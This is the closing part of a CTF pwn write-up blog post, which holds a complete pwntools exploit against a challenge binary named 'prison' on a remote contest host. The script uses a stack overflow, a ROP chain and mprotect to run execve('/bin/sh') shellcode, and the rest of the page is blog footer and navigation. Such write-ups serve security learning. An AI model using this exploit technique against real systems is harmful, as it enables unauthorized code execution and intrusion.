<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&quot;./prison&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;20.84.72.194&quot;</span>,<span class="number">5001</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;./prison&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401a0d</span></span><br><span class="line">pop_rdx=<span class="number">0x401a1a</span></span><br><span class="line">xor_rax=<span class="number">0x000000000042bea9</span></span><br><span class="line"></span><br><span class="line">mg0=<span class="number">0x0000000000419501</span></span><br><span class="line"><span class="comment"># add rdx, 0x60; mov rax, qword ptr [rdi]; mov qword ptr [rdx], rax; ret;</span></span><br><span class="line">xor_edi=<span class="number">0x000000000047ddda</span></span><br><span class="line"><span class="comment"># xor edi, edi; mov eax, edi; ret;</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000401b54</span></span><br><span class="line">rdx=<span class="number">0x0000000000471875</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x4cb3a0</span>)+p64(rdx)+p64(xor_edi)+p64(<span class="number">0x000000000042daa6</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x401b55</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">mrotect=<span class="number">0x000000000042e5b0</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 59</span></span><br><span class="line"><span class="string">    mov rdi,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+p64(pop_rdi)+p64(<span class="number">0x4cb000</span>)+p64(pop_rdx)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x0000000000413676</span>)+p64(<span class="number">0x1000</span>)*<span class="number">2</span>+p64(mrotect)+p64(<span class="number">0x4cb3f0</span>)+shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://cdu-mint.github.io">mint</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://cdu-mint.github.io/2025/04/05/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/">http://cdu-mint.github.io/2025/04/05/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/Decoration/%E9%9B%85.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/04/09/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%B0%E5%BD%95/" title="虚拟机记录"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">虚拟机记录</div></div></a></div><div class="next-post pull-right"><a href="/2025/04/02/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="ctfshow刷题记录"><img class="cover" src="/images/Decoration/%E9%9B%85.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">ctfshow刷题记录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">mint</div><div class="author-info__description">pwn小白</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">this is my blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BD%E5%86%85%E6%AF%94%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">国内比赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XYCTF2025"><span class="toc-number">1.1.</span> <span class="toc-text">XYCTF2025</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#girlfirend"><span class="toc-number">1.1.1.</span> <span class="toc-text">girlfirend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ret2libc%E2%80%99s-Revenge"><span class="toc-number">1.1.2.</span> <span class="toc-text">Ret2libc’s Revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%96%B0%E7%94%9F%E8%B5%9B4-7"><span class="toc-number">1.2.</span> <span class="toc-text">商丘师范学院新生赛4.7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E6%97%B6%E5%8F%AA%E9%81%93%E6%98%AF%E5%AF%BB%E5%B8%B8"><span class="toc-number">1.2.1.</span> <span class="toc-text">当时只道是寻常</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TGCTF"><span class="toc-number">1.3.</span> <span class="toc-text">TGCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-number">1.3.2.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack"><span class="toc-number">1.3.3.</span> <span class="toc-text">stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overflow"><span class="toc-number">1.3.4.</span> <span class="toc-text">overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt"><span class="toc-number">1.3.5.</span> <span class="toc-text">fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#process%E6%96%B0%E5%A7%BF%E5%8A%BF%EF%BC%9A"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">process新姿势：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E5%8D%97%E7%A7%91%E5%A4%A7%E6%A0%A1%E9%98%9F%E6%8B%9B%E6%96%B0%E8%B5%9B"><span class="toc-number">1.4.</span> <span class="toc-text">西南科大校队招新赛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UCSC"><span class="toc-number">1.5.</span> <span class="toc-text">UCSC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BoFido-ucsc"><span class="toc-number">1.5.1.</span> <span class="toc-text">BoFido-ucsc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BD%E9%99%85%E8%B5%9B"><span class="toc-number">2.</span> <span class="toc-text">国际赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#squ1rrel-CTF-2025"><span class="toc-number">2.1.</span> <span class="toc-text">squ1rrel CTF 2025</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jail"><span class="toc-number">2.1.1.</span> <span class="toc-text">jail</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF/" title="蓝桥杯"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝桥杯"/></a><div class="content"><a class="title" href="/2025/04/26/%E8%93%9D%E6%A1%A5%E6%9D%AF/" title="蓝桥杯">蓝桥杯</a><time datetime="2025-04-26T01:26:38.000Z" title="Created 2025-04-26 09:26:38">2025-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/24/%E5%8F%96%E8%AF%81/" title="取证"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="取证"/></a><div class="content"><a class="title" href="/2025/04/24/%E5%8F%96%E8%AF%81/" title="取证">取证</a><time datetime="2025-04-24T07:03:28.000Z" title="Created 2025-04-24 15:03:28">2025-04-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/22/baseCTF%E6%B5%AE%E7%8E%B0/" title="baseCTF浮现"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="baseCTF浮现"/></a><div class="content"><a class="title" href="/2025/04/22/baseCTF%E6%B5%AE%E7%8E%B0/" title="baseCTF浮现">baseCTF浮现</a><time datetime="2025-04-22T06:11:53.000Z" title="Created 2025-04-22 14:11:53">2025-04-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/15/%E5%87%BD%E6%95%B0%E5%90%88%E9%9B%86/" title="函数合集"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="函数合集"/></a><div class="content"><a class="title" href="/2025/04/15/%E5%87%BD%E6%95%B0%E5%90%88%E9%9B%86/" title="函数合集">函数合集</a><time datetime="2025-04-15T12:39:10.000Z" title="Created 2025-04-15 20:39:10">2025-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/09/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%B0%E5%BD%95/" title="虚拟机记录"><img src="/images/Decoration/%E9%9B%85.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机记录"/></a><div class="content"><a class="title" href="/2025/04/09/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%B0%E5%BD%95/" title="虚拟机记录">虚拟机记录</a><time datetime="2025-04-08T16:03:39.000Z" title="Created 2025-04-09 00:03:39">2025-04-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/images/Decoration/%E9%9B%85.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By mint</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>